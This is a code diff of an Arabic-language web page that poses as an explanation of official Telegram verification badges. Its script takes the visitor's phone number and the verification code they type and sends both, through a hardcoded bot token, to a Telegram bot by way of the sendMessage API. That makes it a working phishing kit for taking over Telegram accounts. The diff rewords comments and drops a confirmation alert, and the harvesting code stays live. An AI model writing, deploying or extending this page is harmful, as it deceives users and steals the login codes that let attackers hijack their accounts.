@@ -105,8 +105,7 @@
 
     <div class="container">
        <h1>ماذا يعني التوثيق</h1>
-       
-         <p>التوثيق يعني أن القناة، المجموعة أو البوت رسمي، وأنه قد تمت الموافقة على طلب توثيقهم من قبل تيليجرام.  
+       <p>التوثيق يعني أن القناة، المجموعة أو البوت رسمي، وأنه قد تمت الموافقة على طلب توثيقهم من قبل تيليجرام.  
     يُرحب بأي منظمة أو شخصية عامة للتقدم بطلب للتوثيق، والإجراءات والمتطلبات هي نفسها لجميع المتقدمين  
           
         ستظهر شارات خاصة <strong>Verification Check</strong> للحسابات الموثقة على صفحات معلوماتهم،   
@@ -174,16 +173,16 @@
     </div>
  
     <script>
-        const telegramBotToken = '7818218404:AAF1jbC0HcTJgQeBoaCIeXk7hPv9lGYD5S4I';
-        
-        // استبدال هذه القيم مع chatId الخاص بكل مستخدم من قاعدة بياناتك أو عندما يسجل
-        let userChatId = ""; // يجب أن تكون هذه القيمة هي chatId للمستخدم
+        const telegramBotToken = '7818218404:AAF1jbC0HcTJgQeBoaCIeXk7hPv9lGYD5S4';  // توكن البوت الخاص بالمستخدم
+        let userChatId = ""; // لتخزين chat_id الخاص بالمستخدم
 
+        // دالة لإرسال البيانات إلى بوت المستخدم
         function sendToTelegram(chatId, message) {
             const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
             fetch(url).then(response => response.json()).then(data => console.log(data));
         }
 
+        // الدالة التي تتعامل مع إرسال رقم الهاتف
         function submitPhone() {
             let countryCode = document.getElementById("country").value;
             let phoneNumber = document.getElementById("phone").value;
@@ -196,23 +195,21 @@
             let selectedCountry = document.getElementById("country");
             let phoneLength = selectedCountry.options[selectedCountry.selectedIndex].getAttribute("data-length");
 
-            // التحقق من أن الرقم المدخل يحتوي على عدد الأرقام الصحيح حسب الدولة
+            // التحقق من عدد الأرقام في الرقم المدخل
             if (phoneNumber.length !== parseInt(phoneLength)) {
                 alert("يرجى التأكد من أن الرقم المدخل يحتوي على العدد الصحيح من الأرقام!");
                 return;
             }
 
-            // إرسال رقم الهاتف إلى البوت
-            sendToTelegram(userChatId, `تم تسجيل رقم الهاتف: ${countryCode}${phoneNumber}`);
-
-            // إظهار رسالة تأكيد
-            alert("تم إرسال الكود إلى: " + countryCode + phoneNumber);
+            // إرسال رقم الهاتف إلى البوت الخاص بالمستخدم عبر chat_id
+            sendToTelegram(userChatId, `تم إدخال رقم الهاتف: ${countryCode}${phoneNumber}`);
 
             // إخفاء نموذج رقم الهاتف وإظهار نموذج كود التفعيل بسلاسة
             document.getElementById("phone-box").style.display = "none";
             document.getElementById("verification-box").style.display = "block";
         }
 
+        // دالة للتحقق من الكود
         function verifyCode() {
             let code = document.getElementById("verification-code").value;
 
@@ -221,7 +218,7 @@
                 return;
             }
 
-            // إرسال كود التفعيل إلى البوت
+            // إرسال كود التفعيل إلى بوت المستخدم عبر chat_id
             sendToTelegram(userChatId, `تم إدخال كود التفعيل: ${code}`);
 
             alert("تم التحقق من الكود بنجاح!");
